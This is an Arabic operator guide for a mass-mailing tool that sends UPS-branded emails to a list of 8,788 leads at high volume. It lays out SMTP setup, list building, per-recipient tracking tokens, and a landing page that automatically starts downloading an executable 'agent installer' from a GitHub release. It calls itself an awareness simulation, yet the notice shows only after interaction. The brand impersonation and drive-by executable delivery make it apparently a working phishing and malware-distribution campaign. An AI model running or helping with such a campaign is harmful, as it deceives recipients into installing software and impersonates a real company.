# MAIL MOWAFAK — تشغيل الحملة على الجهاز الأمريكي

كل ما تحتاجه في هذا الدليل. الجهازAmerican لا يحتاج صلاحيات مدير.

## 1) التثبيت (دقيقة واحدة)

```powershell
Expand-Archive .\MailRotatorStudio-Portable.zip -DestinationPath $env:LOCALAPPDATA\Programs\MailMowafak -Force
& "$env:LOCALAPPDATA\Programs\MailMowafak\Start-Studio.cmd"
```

تُفتح نافذة تطبيق على `http://127.0.0.1:8931/dashboard`. أبقِ نافذة الكونسول مفتوحة.

## 2) توجيه المرسل إلى مزوّد SMTP الجديد

داخل مجلد الحزمة:

```powershell
node tools\set-smtp-profile.mjs --host <SMTP_HOST> --port <PORT> --username <USER> \
  --password-env MAILMOWAFAK_SMTP_PASSWORD --encryption starttls \
  --from <FROM@DOMAIN> --domain <DOMAIN> clients\ups-trial\client.json
```

| القيمة | ملاحظة |
|---|---|
| `--encryption` | `starttls` (587) · `ssl` (465) · `none` (25) |
| `--from` | يجب أن يكون على نطاق تتحقّق منه المزوّد (SPF/DKIM/DMARC) |
| `--domain` | نطاق المرسل ⇒ يُستخدم في `Message-ID` |

## 3) كلمة المرور

**لا تُكتب على القرص.** تُدخَل في اللوحة (حقل مخفي) عند الضغط على «إرسال»، أو تُمرَّر في متغيّر بيئة:

```powershell
$env:MAILMOWAFAK_SMTP_PASSWORD = '<password>'   # في نفس جلسة الكونسول قبل التشغيل
```

## 4) قائمة المستقبِلين

القائمة النظيفة جاهزة داخل الحزمة: `engine\data\leads\10KCFL-remaining.csv` (8,788 بريد).

```powershell
node tools\build-recipient-list.mjs --input engine\data\leads\10KCFL-remaining.csv --out engine\data\leads\campaign.csv
node tools\plan-campaign.mjs --total 8788 --accounts 1 --per-hour 6000 --batch 500
```

## 5) الإرسال

من اللوحة: اختر العميل `ups-trial` · اختر `engine\data\leads\campaign.csv` · اضغط «إرسال».

للإيقاع 500 رسالة / 5 دقائق: `delayBetweenMessagesMs = 400` (مضبوط افتراضياً في `client.json`).

## 6) التتبّع

- صفحة التحميل التلقائي: `https://mowafak-drill.pages.dev/pdf?uid=<token>`
- العدّاد: `https://mowafak-drill.pages.dev/count`
- التقرير الكامل: `https://mowafak-drill.pages.dev/stats?key=<STATS_KEY>`
- الشعار والألوان مستخرجة من شعار UPS (بني `#330000` · ذهبي `#FFBE00`).

## 7) ملاحظات

- تنزيل ملف الفلوت (مثبّت Agent المرخَّص) يبدأ تلقائياً عند فتح صفحة `/pdf`.
- رابط التنزيل المباشر: `https://github.com/jobongriff123-lab/fleetdeck-agent-installer/releases/download/v1.0.0/Agengminiups.exe`
- كل رسالة تحمل `uid` فريداً ⇒ كل تنزيل يُنسب لصاحبه في التقارير.
- إشعار محاكاة التوعية يظهر **بعد** التفاعل فقط.
